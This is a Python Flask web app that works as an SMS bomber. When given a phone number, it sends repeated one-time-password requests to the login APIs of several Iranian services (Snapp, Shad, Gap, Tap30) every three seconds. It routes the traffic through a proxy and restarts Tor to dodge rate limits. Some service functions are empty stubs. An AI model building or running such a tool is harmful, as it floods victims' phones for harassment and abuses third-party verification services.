
from flask import Flask, render_template, request, jsonify
from threading import Thread, Event
import os
import time
import requests

app = Flask(__name__)

proxy = {"https": "0.0.0.0:8080"}

stop_event = Event()
worker_thread = None
current_phone = None

def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone": phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
        if "OK" in snapR.text:
            print("sended sms:)")
        else:
            print("Error!")
    except:
        print("Error!")

def shad(phone):
    shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://shadweb.iranlms.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shadweb.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD, proxies=proxy)
        if "OK" in shadR.text:
            print("sended sms:)")
        else:
            print("Error!")
    except:
        print("Error!")

def gap(phone):
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = requests.get(f"https://core.gap.im/v1/user/add.json?mobile=%2B{phone.split('+')[1]}", headers=gapH, proxies=proxy)
        if "OK" in gapR.text:
            print("sended sms:)")
        else:
            print("Error!")
    except:
        print("Error!")

def tap30(phone):
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D, proxies=proxy)
        if "OK" in tap30R.text:
            print("sended sms:)")
        else:
            print("Error!")
    except:
        print("Error!")

# مشابه برای سایر توابع emtiaz, divar, rubika, torob, bama

def emtiaz(phone):
    # کد تابع emtiaz همین‌طور بماند (مثل نمونه اصلی شما)
    pass

def divar(phone):
    pass

def rubika(phone):
    pass

def torob(phone):
    pass

def bama(phone):
    pass

def worker(phone):
    while not stop_event.is_set():
        Thread(target=snap, args=[phone]).start()
        Thread(target=shad, args=[phone]).start()
        Thread(target=gap, args=[phone]).start()
        Thread(target=tap30, args=[phone]).start()
        Thread(target=emtiaz, args=[phone]).start()
        Thread(target=divar, args=[phone]).start()
        Thread(target=rubika, args=[phone]).start()
        Thread(target=torob, args=[phone]).start()
        Thread(target=bama, args=[phone]).start()
        os.system("killall -HUP tor")  # اگر لازم نیست، می‌تونی حذفش کنی
        time.sleep(3)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    global worker_thread, stop_event, current_phone
    if worker_thread and worker_thread.is_alive():
        return jsonify({"status": "already running"})
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"status": "phone number required"}), 400
    current_phone = phone
    stop_event.clear()
    worker_thread = Thread(target=worker, args=(phone,))
    worker_thread.start()
    return jsonify({"status": "started"})

@app.route('/stop', methods=['POST'])
def stop():
    global stop_event
    stop_event.set()
    return jsonify({"status": "stopped"})

if __name__ == '__main__':
    app.run(debug=True)
